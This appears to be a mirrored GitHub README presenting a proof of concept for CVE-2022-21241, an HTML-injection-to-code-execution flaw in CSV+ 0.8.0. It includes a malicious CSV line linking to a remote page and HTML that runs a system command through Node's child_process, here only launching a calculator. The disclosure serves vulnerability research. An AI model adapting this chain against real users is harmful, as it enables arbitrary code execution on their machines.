# csv-plus_vulnerability

ðŸ‘» [PoC] CSV+ 0.8.0 - Arbitrary Code Execution (CVE-2022-21241)

| Infos    | Value                                                              |
| -------- | -------------------------------------------------------------------|
| Username | [https://github.com/satoki](https://github.com/satoki) |
| Url      | [https://github.com/satoki/csv-plus_vulnerability](https://github.com/satoki/csv-plus_vulnerability)                                               |
| Stars    | 25                                                          |
| License  | No License                                                        |

<details>

<summary>Topic / Tags</summary>

* cybersecurity* exploit* poc* security

</details>

## Readme

# csv-plus_vulnerability
ðŸ‘» 2-Click Arbitrary Code Execution Vulnerability.  

![PoC.gif](files/PoC.gif)  

CVE-2022-21241  

âš   
**This PoC was created to alert users and investigate vulnerabilities in their own CSV+, and is prohibited to be used for attacks.**

## Vulnerability
The following versions are vulnerable.  
- CSV+ <= 0.8.0  

Attackers can execute arbitrary code by using the Node.js functionality.
They will place the malicious js code on some site and link it from a-tags with the HTML injection vulnerability in CSV+.

## PoC
![scenario.png](files/scenario.png)  
### Malicious csv file
```csv
<a href='https://electronooooo.htmlbin.net/xsscalc.html'>click me ðŸ‘»</a>
```
`https://electronooooo.htmlbin.net/xsscalc.html` is a temporary link.  
### Malicious html file (calc)
```html
<!DOCTYPE html>
<html>
    <head>
        <script>
        if (confirm("Do you want to run a calculator to check for vulnerabilities?")){
            var cmd = "calc";
            require("child_process").exec(cmd);
        }
        </script>
    </head>
    <body>
        Hi :)
    </body>
</html>
```



## Get the content

```
git clone https://github.com/satoki/csv-plus_vulnerability
cd csv-plus_vulnerability
```

{% embed url="https://github.com/satoki/csv-plus_vulnerability" %}

<figure><img src="https://avatars.githubusercontent.com/u/54702093?v=4" alt=""><figcaption><p>satoki</p></figcaption></figure>
